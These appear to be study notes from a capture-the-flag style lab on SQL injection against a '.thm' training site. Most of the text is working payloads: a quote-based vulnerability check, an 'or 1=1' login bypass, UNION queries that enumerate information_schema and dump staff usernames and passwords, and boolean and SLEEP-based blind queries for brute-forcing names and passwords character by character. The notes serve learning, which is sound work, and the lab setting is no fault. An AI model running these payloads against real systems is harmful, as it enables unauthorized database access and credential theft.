# SQL Injection

![](assets/Pasted%20image%2020241116223725.png)

# [Introduction]()

In this case attacker exploit vulnerable input field in the web page to gain access of the database. Attacker inserts SQL command in the input field that interact with the database.
# [Example]()

![](assets/Pasted%20image%2020241116225912.png)
![](assets/Pasted%20image%2020241116225956.png)

# [SQL Injection Snippets]()

## [Example 0: Check SQL Injection Vulnerability]()

use `'` or `"` to know if the input field is vulnerable to SQL injection.

## [Example 1: In-band SQL Injection (reflected)]()

```sql
1 UNION SELECT 1
```

- If above gives error add another until success

```sql
0 UNION SELECT 1,2
```

```sql
0 UNION SELECT 1,2,3
```

- Above gives no error so look for database

```sql
0 UNION SELECT 1,2,database()
```

- `sqli_one` is the database name found. Get list of tables

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

- Fond `article,staff_users` tables. Get column from `staff_users`

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

- Found `id,password,username` columns. Let's get username and passwords

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
## [Example 2: Blind SQL Injection: Bypass Auth]()
- Inserting below will result `true` for any input

```sql
' or 1=1;--
```

## [Example 3: Blind SQL Injection: Boolean Based]()

`https://website.thm/checkuser?username=admin` this page returns `{"taken":true}`. For username query parameter we will put below sql snippet.

- Similar to example 1, select 1 if error/fail look for select 1,2 and so one

```sql
admin123' UNION SELECT 1;--
```
```
Response:
{"taken":false}
```

```sql
admin123' UNION SELECT 1,2;--
```
```
Response:
{"taken":false}
```

```sql
admin123' UNION SELECT 1,2,3;--
```
```
Response:
{"taken":true}
```

- Now the response `taken` is `true`, look for database.

```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--
```
```
Response:
{"taken":true}
```

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
```
Response:
{"taken":true}
```

- Brute force the name using `database() like 'sa%'` `, database() like 'sa%'`  as the received output is true or false until get  the database name. In this case it is `sqli_three`

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three';--
```
```
Response:
{"taken":true}
```

- Brute force table name until response is true

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

- Similarly brute force column name

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

- Repeating the process to get username and password

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%'
```
```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
```

## [Example 4: Blind SQL: Time Based]()

There is no specific response for injected sql but in this case we use sleep(5) function to wait the server for 5 second. If the server waits for 5 second we know it is vulnerable to sql injection. 

- Similar to above example checking the number of columns by using

```sql
admin123' UNION SELECT SLEEP(5);--
```
![](assets/Pasted%20image%2020241119155113.png)

This didn't wait for 5 seconds try for more number of columns

```sql
admin123' UNION SELECT SLEEP(5),2;--
```
![](assets/Pasted%20image%2020241119155233.png)

This waited for 5 seconds telling there are 3 columns

## [Example 5: Out of band SQL]()

1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2. The Website makes an SQL query to the database, which also passes the hacker's payload.
3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

![](assets/Pasted%20image%2020241119160027.png)

